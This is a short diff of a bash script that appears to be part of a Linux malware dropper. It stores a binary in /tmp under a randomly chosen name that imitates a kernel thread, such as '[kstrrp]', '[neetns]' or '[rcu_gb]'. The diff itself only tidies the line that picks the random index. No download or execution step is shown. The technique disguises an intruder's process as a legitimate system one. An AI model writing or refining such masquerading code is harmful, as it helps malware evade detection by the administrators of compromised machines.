@@ -1,7 +1,7 @@
 #!/bin/bash
 WORK_DIR="/tmp"
 RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]" "[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")
-RANDOMIZE=$(( (RANDOM % 7)  + 0))
+RANDOMIZE=$((RANDOM % 7))
 BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
 FULL_BIN_PATH="${WORK_DIR}/${BIN_FILE}"
 
